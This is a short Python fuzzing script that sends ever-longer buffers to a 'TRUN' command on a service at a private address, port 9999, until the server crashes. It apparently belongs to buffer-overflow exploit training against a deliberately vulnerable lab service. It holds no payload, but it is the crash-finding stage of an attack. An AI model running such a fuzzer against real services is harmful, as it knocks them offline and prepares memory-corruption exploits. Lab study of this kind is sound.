#!/usr/bin/env python3
import sys, socket
from time import sleep

RHOST = "192.168.0.108"
RPORT = 9999

buffer = b"TRUN /.:/"
socket.setdefaulttimeout(2)

while True:
  try:
    buffer = buffer + b"1" * 100
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    print("[-] Sending buffer with a length of: " + str(len(buffer)))
    s.send(buffer)
    s.close()
    sleep(0.5)
  except:
    print("[!] Last buffer probably crashed server :(")
    sys.exit(0)
